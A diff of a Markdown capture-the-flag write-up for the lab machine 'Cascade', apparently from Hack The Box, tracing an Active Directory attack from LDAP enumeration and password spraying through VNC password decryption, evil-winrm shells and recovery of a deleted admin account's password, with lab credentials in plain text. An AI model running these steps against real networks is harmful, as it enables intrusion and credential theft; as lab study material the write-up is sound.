@@ -250,107 +250,241 @@ tree connect failed: NT_STATUS_ACCESS_DENIED
 
 I tried connecting to each folder anonymously to see what I could find.  I was able to login successfully, but the ACL denied me access to those folders. Odd!
 
-```text
+
 ### ldapsearch
+
 ```
+# Remote Management Users, Groups, UK, cascade.local
+dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: group
+cn: Remote Management Users
+member: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
+member: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+distinguishedName: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=lo
+ cal
+instanceType: 4
+whenCreated: 20200113032705.0Z
+whenChanged: 20200117213541.0Z
+uSNCreated: 94253
+uSNChanged: 127173
+name: Remote Management Users
+objectGUID:: mcLF5nZ80kCiOcrXdXFmjA==
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZgQAAA==
+sAMAccountName: Remote Management Users
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117213546.0Z
+dSCorePropagationData: 20200117213257.0Z
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 16010714223232.0Z
 
-## Remote Management Users, Groups, UK, cascade.local
-
-dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local objectClass: top objectClass: group cn: Remote Management Users member: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local member: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local distinguishedName: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=lo cal instanceType: 4 whenCreated: 20200113032705.0Z whenChanged: 20200117213541.0Z uSNCreated: 94253 uSNChanged: 127173 name: Remote Management Users objectGUID:: mcLF5nZ80kCiOcrXdXFmjA== objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZgQAAA== sAMAccountName: Remote Management Users sAMAccountType: 536870912 groupType: -2147483644 objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=cascade,DC=local dSCorePropagationData: 20200117213546.0Z dSCorePropagationData: 20200117213257.0Z dSCorePropagationData: 20200117033736.0Z dSCorePropagationData: 20200117001404.0Z dSCorePropagationData: 16010714223232.0Z
-
-```text
 SHARES:
 \\Casc-DC1\Audit$
 \\Casc-DC1\Data
-Each of these shares also had an associated security group.
+
+# Ryan Thompson, Users, UK, cascade.local
+dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ryan Thompson
+sn: Thompson
+givenName: Ryan
+distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200109193126.0Z
+whenChanged: 20200624203207.0Z
+displayName: Ryan Thompson
+uSNCreated: 24610
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+uSNChanged: 319688
+name: Ryan Thompson
+objectGUID:: LfpD6qngUkupEy9bFXBBjA==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132247339091081169
+lastLogoff: 0
+lastLogon: 132247339125713230
+pwdLastSet: 132230718862636251
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 2
+sAMAccountName: r.thompson
+sAMAccountType: 805306368
+userPrincipalName: r.thompson@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200126183918.0Z
+dSCorePropagationData: 20200119174753.0Z
+dSCorePropagationData: 20200119174719.0Z
+dSCorePropagationData: 20200119174508.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 132375043274134331
+msDS-SupportedEncryptionTypes: 0
+cascadeLegacyPwd: clk0bjVldmE=
 ```
-
-## Ryan Thompson, Users, UK, cascade.local
-
-dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Ryan Thompson sn: Thompson givenName: Ryan distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local instanceType: 4 whenCreated: 20200109193126.0Z whenChanged: 20200624203207.0Z displayName: Ryan Thompson uSNCreated: 24610 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local uSNChanged: 319688 name: Ryan Thompson objectGUID:: LfpD6qngUkupEy9bFXBBjA== userAccountControl: 66048 badPwdCount: 0 codePage: 0 countryCode: 0 badPasswordTime: 132247339091081169 lastLogoff: 0 lastLogon: 132247339125713230 pwdLastSet: 132230718862636251 primaryGroupID: 513 objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA== accountExpires: 9223372036854775807 logonCount: 2 sAMAccountName: r.thompson sAMAccountType: 805306368 userPrincipalName: r.thompson@cascade.local objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local dSCorePropagationData: 20200126183918.0Z dSCorePropagationData: 20200119174753.0Z dSCorePropagationData: 20200119174719.0Z dSCorePropagationData: 20200119174508.0Z dSCorePropagationData: 16010101000000.0Z lastLogonTimestamp: 132375043274134331 msDS-SupportedEncryptionTypes: 0 cascadeLegacyPwd: clk0bjVldmE=
-
-```text
 Easily overlooked, there was an entry on the user `r.thompson` that seemed to have a potential password. `cascadeLegacyPwd: clk0bjVldmE=`
 
 Base64 decoding this give: `rY4n5eva`
 
-### crackmapexec
-```
+### crackmapexec 
 
+```
 zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
 
-Windows 6.1 Build 7601 x64 \(name:CASC-DC1\) \(domain:CASCADE\) \(signing:True\) \(SMBv1:False\) zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182 SMB 10.10.10.182 445 CASC-DC1 \[\*\] Windows 6.1 Build 7601 x64 \(name:CASC-DC1\) \(domain:Cascade\) \(signing:True\) \(SMBv1:False\) SMB 10.10.10.182 445 CASC-DC1 \[-\] Cascade\CascGuest:rY4n5eva STATUS\_LOGON\_FAILURE SMB 10.10.10.182 445 CASC-DC1 \[-\] Cascade\arksvc:rY4n5eva STATUS\_LOGON\_FAILURE SMB 10.10.10.182 445 CASC-DC1 \[-\] Cascade\s.smith:rY4n5eva STATUS\_LOGON\_FAILURE SMB 10.10.10.182 445 CASC-DC1 \[+\] Cascade\r.thompson:rY4n5eva
+Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:CASCADE) (signing:True) (SMBv1:False)
+zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\r.thompson:rY4n5eva
+```
 
-```text
-## Initial Foothold
-### Enumeration as User `r.thompson`
+# Initial Foothold
+
+## Enumeration as User `r.thompson`
 
 ### smbmap
+
+```
+zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
+[+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Audit$                                                  NO ACCESS
+        C$                                                      NO ACCESS       Default share
+        Data                                                    READ ONLY
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        print$                                                  READ ONLY       Printer Drivers
+        SYSVOL                                                  READ ONLY       Logon server share
 ```
 
-zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva \[+\] IP: 10.10.10.182:445 Name: Casc-DC1  
-Disk Permissions Comment
-
-```text
-    ADMIN$                                                  NO ACCESS       Remote Admin
-    Audit$                                                  NO ACCESS
-    C$                                                      NO ACCESS       Default share
-    Data                                                    READ ONLY
-    IPC$                                                    NO ACCESS       Remote IPC
-    NETLOGON                                                READ ONLY       Logon server share 
-    print$                                                  READ ONLY       Printer Drivers
-    SYSVOL                                                  READ ONLY       Logon server share
-```
-
-```text
 ### smbclient
 
 `r.thompson` is a member of the `IT` group so that is probably what he has access to. However, it seems to be a dead end.
+
+```
+smb: \> ls IT\
+  .                                   D        0  Tue Jan 28 13:04:51 2020
+  ..                                  D        0  Tue Jan 28 13:04:51 2020
+  Email Archives                      D        0  Tue Jan 28 13:00:30 2020
+  LogonAudit                          D        0  Tue Jan 28 13:04:40 2020
+  Logs                                D        0  Tue Jan 28 19:53:04 2020
+  Temp                                D        0  Tue Jan 28 17:06:59 2020
+
+                13106687 blocks of size 4096. 7795046 blocks available
+smb: \> tarmode
+tar:311  tarmode is now full, system, hidden, noreset, quiet
+smb: \> recurse
+smb: \> prompt
+smb: \> mget *
+getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
+getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (6.9 KiloBytes/sec) (average 9.0 KiloBytes/sec)
+getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (28.3 KiloBytes/sec) (average 15.4 KiloBytes/sec)
+getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (13.8 KiloBytes/sec) (average 15.0 KiloBytes/sec)
 ```
 
-smb: &gt; ls IT . D 0 Tue Jan 28 13:04:51 2020 .. D 0 Tue Jan 28 13:04:51 2020 Email Archives D 0 Tue Jan 28 13:00:30 2020 LogonAudit D 0 Tue Jan 28 13:04:40 2020 Logs D 0 Tue Jan 28 19:53:04 2020 Temp D 0 Tue Jan 28 17:06:59 2020
-
-```text
-            13106687 blocks of size 4096. 7795046 blocks available
-```
-
-smb: &gt; tarmode tar:311 tarmode is now full, system, hidden, noreset, quiet smb: &gt; recurse smb: &gt; prompt smb: &gt; mget \* getting file \IT\Email Archives\Meeting\_Notes\_June\_2018.html of size 2522 as Meeting\_Notes\_June\_2018.html \(10.7 KiloBytes/sec\) \(average 10.7 KiloBytes/sec\) getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log \(6.9 KiloBytes/sec\) \(average 9.0 KiloBytes/sec\) getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log \(28.3 KiloBytes/sec\) \(average 15.4 KiloBytes/sec\) getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg \(13.8 KiloBytes/sec\) \(average 15.0 KiloBytes/sec\)
-
-```text
 I used a little trick I leared on the machine `Nest` for downloading all of the files in an SMB folder recursively. Next I browsed through my loot.
 
 image here
 I found another potential username `TempAdmin` in the email file.
+
+```
+/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
+1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
+1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
+2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
+2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
+2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
+8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
+8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
+8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
 ```
 
-/10/2018 15:43 \[MAIN\_THREAD\]  **STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2**  1/10/2018 15:43 \[MAIN\_THREAD\] Validating settings... 1/10/2018 15:43 \[MAIN\_THREAD\] Error: Access is denied 1/10/2018 15:43 \[MAIN\_THREAD\] Exiting with error code 5 2/10/2018 15:56 \[MAIN\_THREAD\]  **STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2**  2/10/2018 15:56 \[MAIN\_THREAD\] Validating settings... 2/10/2018 15:56 \[MAIN\_THREAD\] Running as user CASCADE\ArkSvc 2/10/2018 15:56 \[MAIN\_THREAD\] Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local 2/10/2018 15:56 \[MAIN\_THREAD\] Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local 2/10/2018 15:56 \[MAIN\_THREAD\] Exiting with error code 0 8/12/2018 12:22 \[MAIN\_THREAD\]  **STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2**  8/12/2018 12:22 \[MAIN\_THREAD\] Validating settings... 8/12/2018 12:22 \[MAIN\_THREAD\] Running as user CASCADE\ArkSvc 8/12/2018 12:22 \[MAIN\_THREAD\] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local 8/12/2018 12:22 \[MAIN\_THREAD\] Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local 8/12/2018 12:22 \[MAIN\_THREAD\] Exiting with error code 0
-
-```text
 this looked interesting.  If I could login as this service I would probably have SeBackupPrivilege which would grant pretty much instant pwn. this service also has `Remote Manacement Users` group membership so it seems likely that this is a good path to look for.
+
+```
+zweilos@kalimaa:~/htb/cascade/IT/Temp/s.smith$ cat VNC\ Install.reg 
+��Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+"ExtraPorts"=""
+"QueryTimeout"=dword:0000001e
+"QueryAcceptOnTimeout"=dword:00000000
+"LocalInputPriorityTimeout"=dword:00000003
+"LocalInputPriority"=dword:00000000
+"BlockRemoteInput"=dword:00000000
+"BlockLocalInput"=dword:00000000
+"IpAccessControl"=""
+"RfbPort"=dword:0000170c
+"HttpPort"=dword:000016a8
+"DisconnectAction"=dword:00000000
+"AcceptRfbConnections"=dword:00000001
+"UseVncAuthentication"=dword:00000001
+"UseControlAuthentication"=dword:00000000
+"RepeatControlAuthentication"=dword:00000000
+"LoopbackOnly"=dword:00000000
+"AcceptHttpConnections"=dword:00000001
+"LogLevel"=dword:00000000
+"EnableFileTransfers"=dword:00000001
+"RemoveWallpaper"=dword:00000001
+"UseD3D"=dword:00000001
+"UseMirrorDriver"=dword:00000001
+"EnableUrlParams"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+"AlwaysShared"=dword:00000000
+"NeverShared"=dword:00000000
+"DisconnectClients"=dword:00000001
+"PollingInterval"=dword:000003e8
+"AllowLoopback"=dword:00000000
+"VideoRecognitionInterval"=dword:00000bb8
+"GrabTransparentWindows"=dword:00000001
+"SaveLogToAllUsersPath"=dword:00000000
+"RunControlInterface"=dword:00000001
+"IdleTimeout"=dword:00000000
+"VideoClasses"=""
+"VideoRects"=""
 ```
 
-zweilos@kalimaa:~/htb/cascade/IT/Temp/s.smith$ cat VNC Install.reg ��Windows Registry Editor Version 5.00
-
-\[HKEY\_LOCAL\_MACHINE\SOFTWARE\TightVNC\]
-
-\[HKEY\_LOCAL\_MACHINE\SOFTWARE\TightVNC\Server\] "ExtraPorts"="" "QueryTimeout"=dword:0000001e "QueryAcceptOnTimeout"=dword:00000000 "LocalInputPriorityTimeout"=dword:00000003 "LocalInputPriority"=dword:00000000 "BlockRemoteInput"=dword:00000000 "BlockLocalInput"=dword:00000000 "IpAccessControl"="" "RfbPort"=dword:0000170c "HttpPort"=dword:000016a8 "DisconnectAction"=dword:00000000 "AcceptRfbConnections"=dword:00000001 "UseVncAuthentication"=dword:00000001 "UseControlAuthentication"=dword:00000000 "RepeatControlAuthentication"=dword:00000000 "LoopbackOnly"=dword:00000000 "AcceptHttpConnections"=dword:00000001 "LogLevel"=dword:00000000 "EnableFileTransfers"=dword:00000001 "RemoveWallpaper"=dword:00000001 "UseD3D"=dword:00000001 "UseMirrorDriver"=dword:00000001 "EnableUrlParams"=dword:00000001 "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f "AlwaysShared"=dword:00000000 "NeverShared"=dword:00000000 "DisconnectClients"=dword:00000001 "PollingInterval"=dword:000003e8 "AllowLoopback"=dword:00000000 "VideoRecognitionInterval"=dword:00000bb8 "GrabTransparentWindows"=dword:00000001 "SaveLogToAllUsersPath"=dword:00000000 "RunControlInterface"=dword:00000001 "IdleTimeout"=dword:00000000 "VideoClasses"="" "VideoRects"=""
-
-```text
 As soon as I saw the VNC install .reg key I knew there would be a password in it, and I was not dissapointed.  
 https://github.com/frizb/PasswordDecrypts
 
 >VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines.
+
+```
+$> msfconsole
+
+msf5 > irb
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+
+irb: warn: can't alias jobs from irb_jobs.
+>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+>> require 'rex/proto/rfb'
+=> true
+>> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), fixedkey
+=> "sT333ve2"
 ```
 
-$&gt; msfconsole
-
-msf5 &gt; irb \[_\] Starting IRB shell... \[_\] You are in the "framework" object
-
-irb: warn: can't alias jobs from irb\_jobs.
-
-> > fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07" require 'rex/proto/rfb' =&gt; true Rex::Proto::RFB::Cipher.decrypt \["6BCF2A4B6E5ACA0F"\].pack\('H\*'\), fixedkey =&gt; "sT333ve2" \`\`\`
-
-```text
+```
 zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
 SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
 SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
@@ -369,7 +503,7 @@ SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\s.smith:sT333ve2
 
 #### User.txt
 
-```text
+```PowerShell
 zweilos@kalimaa:~/htb/cascade$ evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
 
 Evil-WinRM shell v2.3
@@ -426,7 +560,7 @@ f29abe4e609b2aebb4fe99257a9eb507
 
 ### smbmap
 
-```text
+```cmd
 zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
 [+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
         Disk                                                    Permissions     Comment
@@ -443,7 +577,7 @@ zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
 
 smith has access to the IT Data and Audit shares, as well as print$ and SYSVOL
 
-```text
+```cmd
 zweilos@kalimaa:~/htb/cascade$ smbclient -U s.smith -W Cascade \\\\10.10.10.182\\Audit$
 Enter CASCADE\s.smith's password: 
 Try "help" to get a list of possible commands.
@@ -471,7 +605,7 @@ CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
 
 using the command `sqlite3 Auditdb` gets me a sqlite shell where I can enumerate the database
 
-```text
+```sql
 zweilos@kalimaa:~/htb/cascade$ sqlite3 Audit.db 
 SQLite version 3.31.1 2020-01-27 19:55:54
 Enter ".help" for usage hints.
@@ -514,7 +648,7 @@ w3lc0meFr31nd I'm not sure what the undecipherable characters are in the output,
 
 ### Moving Laterally to user `arksvc`
 
-```text
+```PowerShell
 zweilos@kalimaa:~/htb/cascade$ evil-winrm -u arksvc -p w3lc0meFr31nd -i 10.10.10.182
 
 Evil-WinRM shell v2.3
@@ -566,13 +700,13 @@ Darn, I expected this user to have SeBackupPrivilege. Oh well, so much for the e
 
 It looks like I can use this to revive the `TempAdmin` account that we saw had been deleted in the database. 
 
-```text
+```PowerShell
 Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
 ```
 
 Running this command from the article returns:
 
-```text
+```PowerShell
 Deleted           : True
 DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
 Name              : CASC-WS1
@@ -630,7 +764,7 @@ At line:1 char:1
 
 Well that looks like a bust...what else can this user do with a deleted account? I tried trimming down the command to see how different the output was. 
 
-```text
+```PowerShell
 *Evil-WinRM* PS C:\Program Files (x86)> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 
 --snipped--
@@ -734,7 +868,7 @@ WINRM       10.10.10.182    5985   CASC-DC1         [+] Cascade\Administrator:ba
 
 Pwn3d!
 
-```text
+```PowerShell
 zweilos@kalimaa:~/htb/cascade$ evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182
 
 Evil-WinRM shell v2.3
